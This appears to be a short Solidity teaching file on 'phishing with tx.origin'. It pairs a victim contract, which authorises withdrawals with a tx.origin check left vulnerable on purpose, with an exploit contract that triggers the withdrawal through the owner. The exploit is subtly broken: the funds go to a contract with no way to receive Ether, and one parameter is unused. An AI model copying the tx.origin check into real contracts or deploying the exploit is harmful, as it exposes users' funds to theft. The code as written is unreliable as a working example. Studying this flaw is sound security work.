// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Phishing with tx.origin
contract TxOriginVictim {
    address public owner;
    constructor() {
        owner = msg.sender;
    }
    function withdraw() public {
        require(tx.origin == owner, "Not owner");
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract TxOriginExploit {
    TxOriginVictim victim;
    constructor(address _victim) {
        victim = TxOriginVictim(_victim);
    }
    function exploit(address _owner) public {
        victim.withdraw();
    }
}
